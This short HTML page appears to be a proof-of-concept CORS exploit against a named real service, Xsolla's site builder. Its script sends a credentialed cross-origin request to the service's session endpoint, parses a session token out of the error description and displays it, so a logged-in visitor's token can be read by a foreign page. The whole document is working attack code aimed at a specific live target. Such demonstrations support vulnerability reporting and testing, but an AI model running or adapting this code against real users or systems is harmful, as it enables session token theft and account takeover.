<!DOCTYPE html>
<html>
<head>
    <title>CORS TesT - Token Extraction</title>
</head>
<body>
    <h2>Response from Xsolla:</h2>
    <pre id="response" style="background: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;"></pre>
    
    <h3>Extracted Token:</h3>
    <pre id="token" style="background: #ffeb3b; padding: 10px; border-radius: 5px; word-break: break-all;"></pre>

    <script>
    fetch('https://sitebuilder.xsolla.com/api/session', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors'
    })
    .then(response => response.json())
    .then(data => {
        // Display full response
        document.getElementById('response').textContent = JSON.stringify(data, null, 2);
        
        // Extract token from error description
        const errorDesc = data.error?.description || '';
        const tokenMatch = errorDesc.match(/token: ([^\s;]+)/);
        
        if (tokenMatch && tokenMatch[1]) {
            document.getElementById('token').textContent = tokenMatch[1];
        } else {
            document.getElementById('token').textContent = 'No token found in response';
        }
    })
    .catch(err => {
        document.getElementById('response').textContent = 'Error: ' + err.message;
        document.getElementById('token').textContent = 'Failed to fetch';
    });
    </script>
</body>
</html>
